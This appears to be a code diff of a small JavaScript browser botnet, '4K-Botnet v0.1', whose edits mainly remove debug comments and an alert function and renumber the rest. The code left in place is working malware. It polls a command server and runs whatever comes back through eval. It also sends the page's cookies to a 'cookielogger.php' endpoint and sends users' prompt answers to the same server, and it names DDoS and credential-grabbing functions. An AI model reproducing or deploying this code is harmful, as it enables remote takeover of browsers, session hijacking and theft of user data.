@@ -1,16 +1,6 @@
 //4K-Botnet v0.1 by Chowix40
 //I know it's crap but it works (Kinda)
 var SERVER_URL = 'http://example.com/Botnet/'
-//console.log('4K-Botnet v0.1 by Chowix40')
-
-//Stage 0 - Shows it's been injected
-//console.log('Hijacked - Stage 0');
-
-//Stage 1 - Tells the server "I'm Here!"
-//console.log('Connected to server - Stage 1');
-
-//Stage 2 - Get Commands
-//console.log('Got Commands - Stage 2')
 
 function getCMD() {
 var oReqcmd = new XMLHttpRequest();    
@@ -28,7 +18,7 @@ eval(oReqcmd.responseText)
 //console.log('Execute commands - Stage 3')
 getCMD()
 
-//Functions - 1. DDoS, 2. Get_Creds, 3. Cookie_Grabber 4. userAlert 5. promptUser
+//Functions - 1. DDoS, 2. Get_Creds, 3. Cookie_Grabber 4. Injectheader 5. promptUser
 
 //1) DDos
 function DDoS() { 
@@ -100,19 +90,13 @@ var pic = new Image()
 pic.src = SERVER_URL+'cookielogger.php?cookie='+document.cookie
 } //Done 
 
-//4) Alert_User
-function userAlert() {
-//console.log('Alerting user: ' + arguments[0]);
-alert(arguments[0])
-} //Done 
-
-//5) injectHeader
+//4) injectHeader
 function injectHeader() {
    // console.log('Injecting the header: ' + arguments[0])
     d=document;e=d.createElement("h1");e.innerHTML=arguments[0];d.body.appendChild(e)
 } //It works, but Needs work, it inserts header at bottom of page- need to get it on the top, might remove in the future
 
-//6) promptUser
+//5) promptUser
 function promptUser() {
     console.log('Prompting the user: '+arguments[0])
     var promptAnswer = prompt(arguments[0]);
@@ -121,4 +105,4 @@ function promptUser() {
     pic.src = SERVER_URL+'prompt.php?answer='+promptAnswer
 } //Done
 
-//7) ???
+//6) ???
